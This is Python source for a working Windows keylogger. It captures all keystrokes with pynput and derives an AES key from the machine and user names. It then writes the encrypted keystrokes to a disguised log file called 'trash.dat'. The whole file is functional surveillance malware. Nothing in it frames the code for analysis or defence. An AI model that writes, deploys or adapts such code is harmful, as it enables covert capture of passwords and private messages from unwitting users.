import os
import logging
import platform
import binascii
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import win32api

log_file = "trash.dat"

machine_id = platform.node().encode()
user_info = win32api.GetUserName().encode()
garbage = b"#$!k9zPqR7mN2vX"
derived_seed = machine_id + user_info + garbage
machine_id_hex = binascii.hexlify(machine_id)
user_info_hex = binascii.hexlify(user_info)
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,  
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = kdf.derive(derived_seed)
nonce = os.urandom(16)
cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
encryptor = cipher.encryptor()
with open(log_file, "wb") as f:
    machine_id_hex_len = len(machine_id_hex).to_bytes(2, 'big')
    user_info_hex_len = len(user_info_hex).to_bytes(2, 'big')
    f.write(machine_id_hex_len + machine_id_hex + user_info_hex_len + user_info_hex + salt + nonce)
keystroke_buffer = ""

def flush_buffer():
    global encryptor, keystroke_buffer
    if keystroke_buffer:
        encrypted_data = encryptor.update(keystroke_buffer.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted_data)
        keystroke_buffer = ""

def on_press(key):
    global keystroke_buffer
    try:
        if key in (keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r):
            return  
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:  
                keystroke_buffer = keystroke_buffer[:-1]
            return  
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            char = f"[{key.name.upper()}]"

        keystroke_buffer += char
        if len(keystroke_buffer) >= 10:
            flush_buffer()

    except Exception as e:
        logging.error(f"Error: {e}")
logging.basicConfig(filename='errors.log', level=logging.ERROR)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

flush_buffer()
final_data = encryptor.finalize()
with open(log_file, "ab") as f:
    f.write(final_data)